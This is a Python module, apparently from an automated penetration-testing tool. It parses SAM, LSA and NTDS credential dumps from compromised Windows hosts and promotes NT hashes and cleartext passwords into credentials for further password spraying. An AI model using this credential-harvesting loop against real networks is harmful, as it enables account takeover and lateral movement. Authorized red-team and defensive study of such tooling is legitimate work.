"""Turn a credential dump into loot and new credentials — ``loot → creds``.

When a spray goes ``(Pwn3d!)`` on a host, the loop dumps its secrets (``nxc --sam
--lsa``, an NTDS pull) and mines them for the next round's credentials. This module
reads that output. It is deliberately conservative about *promotion*: a SAM/NTDS NT
hash or an LSA cleartext password becomes a usable credential, but a cached ``$DCC2$``
blob, a machine-account hash or a DPAPI key is kept as **loot only** — those are
evidence, not something the loop can authenticate with, and treating a ``$DCC2$``
string as a password would poison the spray.

Everything recognizable is recorded as loot regardless; promotion is the subset the
credential loop can actually reuse.
"""
import re
from dataclasses import dataclass, replace

from .creds import EMPTY_LM, Credential
from .netexec import strip_prefix

_HEX32 = r"[0-9a-fA-F]{32}"

#: secretsdump / pwdump:  [domain\]user:RID:LM:NT:::   (SAM, NTDS)
_PWDUMP = re.compile(
    rf"^(?P<principal>[^:]+):(?P<rid>\d+):(?P<lm>{_HEX32}):(?P<nt>{_HEX32}):"
    r"[^:]*:[^:]*:\s*$")

#: LSA cleartext line:  [domain\]principal:secret   (secret classified below)
_CLEARTEXT = re.compile(r"^(?P<principal>[^:]+):(?P<secret>.+)$")

#: A secret we must NOT promote to a password: cached domain creds, machine/AES keys,
#: DPAPI material, raw hex. These stay loot.
_NOT_A_PASSWORD = re.compile(r"^(\$|0x|aes|[0-9a-fA-F]{32,}$)", re.I)

_SECTION_MARKERS = (
    ("sam", re.compile(r"Dumping SAM", re.I)),
    ("lsa", re.compile(r"Dumping LSA", re.I)),
    ("ntds", re.compile(r"Dumping (the )?NTDS", re.I)),
)


@dataclass(frozen=True)
class DumpEntry:
    """One recovered secret. ``credential`` is set only when it can be reused."""

    section: str            # sam | lsa | ntds | unknown
    kind: str               # loot kind: sam_hash | lsa_secret | ntds_hash
    raw: str                # the dump line, verbatim — the loot value
    principal: str = ""
    credential: Credential = None

    @property
    def promotable(self):
        return self.credential is not None


def _split_principal(principal):
    """``DOMAIN\\user`` → ``(domain, user)``; a bare name → ``('', name)``."""
    domain, _, user = principal.rpartition("\\")
    return domain, user or principal


def _skip(body):
    """Section headers, status markers and impacket summary lines carry no secret."""
    if not body or body[0] in "[":
        return True
    low = body.lower()
    return low.startswith(("dumping", "added ", "[+]", "[-]", "[*]")) or "written to" in low


def parse_dump(text):
    """Parse ``nxc --sam/--lsa/--ntds`` (or a raw secretsdump) into :class:`DumpEntry`.

    Returns entries in file order. Section is tracked from the ``Dumping …`` headers
    so a SAM hash is marked local and an LSA/NTDS secret domain-scoped; a paste with
    no header falls back to ``unknown`` and promotes hashes without the local flag.
    """
    section = "unknown"
    entries = []
    for line in text.splitlines():
        body = strip_prefix(line).strip()
        for name, marker in _SECTION_MARKERS:
            if marker.search(body):
                section = name
                break
        if _skip(body):
            continue
        entry = _classify(section, body)
        if entry is not None:
            entries.append(entry)
    return entries


def _classify(section, body):
    m = _PWDUMP.match(body)
    if m:
        return _from_pwdump(section, body, m)
    m = _CLEARTEXT.match(body)
    if m:
        return _from_cleartext(section, body, m)
    return None


def _from_pwdump(section, body, m):
    domain, user = _split_principal(m.group("principal"))
    lm, nt = m.group("lm").lower(), m.group("nt").lower()
    local = section == "sam"                 # SAM = local accounts; NTDS = domain
    if lm in (EMPTY_LM, "0" * 32):
        secret_type, secret = "nt", nt
    else:
        secret_type, secret = "lm:nt", f"{lm}:{nt}"
    kind = "sam_hash" if section == "sam" else ("ntds_hash" if section == "ntds" else "nt_hash")
    cred = _safe_credential(username=user, secret=secret, secret_type=secret_type,
                            domain=domain, local_auth=local)
    return DumpEntry(section=section, kind=kind, raw=body, principal=m.group("principal"),
                     credential=cred)


def _from_cleartext(section, body, m):
    principal, secret = m.group("principal"), m.group("secret")
    domain, user = _split_principal(principal)
    kind = "lsa_secret" if section in ("lsa", "unknown") else f"{section}_secret"
    cred = None
    promotable = (
        not _NOT_A_PASSWORD.match(secret)
        and not user.endswith("$")           # machine account, not a login we reuse
        and "$" not in secret
        and user)
    if promotable:
        cred = _safe_credential(username=user, secret=secret, secret_type="password",
                                domain=domain, local_auth=False)
    return DumpEntry(section=section, kind=kind, raw=body, principal=principal,
                     credential=cred)


def _safe_credential(**kw):
    """Build a Credential, or None if it is malformed (never abort a whole dump)."""
    try:
        return Credential(**kw)
    except Exception:
        return None
